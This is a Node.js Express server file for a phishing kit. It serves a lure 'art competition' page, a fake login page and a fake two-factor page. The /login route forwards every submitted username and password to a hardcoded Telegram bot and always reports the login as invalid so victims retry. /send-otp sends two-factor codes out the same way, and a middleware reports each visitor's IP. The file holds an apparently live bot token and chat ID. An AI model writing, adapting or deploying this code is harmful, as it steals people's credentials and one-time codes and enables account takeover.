const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const port = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public', 'website')));

// Replace with your bot token and chat id
const BOT_TOKEN = '7138395020:AAF98yTTnZ_jDkGLqdbmNGo9_GkGYotoHl8';
const CHAT_ID = '1779078520';

let pendingLogins = {};

// Function to send a message to Telegram bot
function sendToTelegram(message) {
  return axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message
  });
}

// Middleware to log and send visitor IP address to Telegram
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  // Send visitor IP to Telegram bot
  sendToTelegram(`Visitor IP: ${ip}`)
    .then(() => console.log(`Visitor IP sent to Telegram: ${ip}`))
    .catch(error => console.error('Error sending visitor IP to Telegram:', error));
  
  next();
});

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'website', 'story_page', 'index.html'));
});

app.get('/art-competition', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'website', 'login page', 'index.html'));
});

app.get('/two-factor-authentication', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'website', 'two-factor-authentication', 'index.html'));
});

app.get('/handler', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'website', 'handler', 'handler.html'));
});

app.get('/loadcss', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'website', 'login page', 'assets', 'css', 'main.css'));
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const loginId = Date.now().toString();
  pendingLogins[loginId] = { username, password, resolved: true, valid: false }; // Always set to invalid
  
  // Send login details to Telegram bot
  sendToTelegram(`Login Attempt:\nUsername: ${username}\nPassword: ${password}`)
    .then(() => {
      res.status(200).json({ message: 'pending', loginId });
    })
    .catch(error => {
      console.error('Error sending message to Telegram:', error);
      res.status(500).json({ message: 'Error processing login' });
    });
});

app.get('/check-login-status/:loginId', (req, res) => {
  const { loginId } = req.params;
  const login = pendingLogins[loginId];
  
  if (!login) {
    res.status(404).json({ message: 'Login attempt not found' });
  } else {
    // Always return invalid login and redirect to original page
    res.status(200).json({ message: 'invalid', redirect: '/' });
    delete pendingLogins[loginId];
  }
});

app.get('/pending-logins', (req, res) => {
  const unresolved = Object.entries(pendingLogins)
    .filter(([_, login]) => !login.resolved)
    .map(([id, { username, password }]) => ({ id, username, password }));
  res.json(unresolved);
});

app.post('/resolve-login', (req, res) => {
  const { loginId, valid } = req.body;
  if (pendingLogins[loginId]) {
    // Always set to invalid
    pendingLogins[loginId].resolved = true;
    pendingLogins[loginId].valid = false;
    res.status(200).json({ message: 'Login resolved' });
  } else {
    res.status(404).json({ message: 'Login attempt not found' });
  }
});

app.post('/send-otp', async (req, res) => {
  const { otp } = req.body;
  try {
    await sendToTelegram(`Two-factor authentication OTP: ${otp}`);
    res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error sending OTP to Telegram:', error);
    res.status(500).json({ success: false, message: 'Error sending OTP' });
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});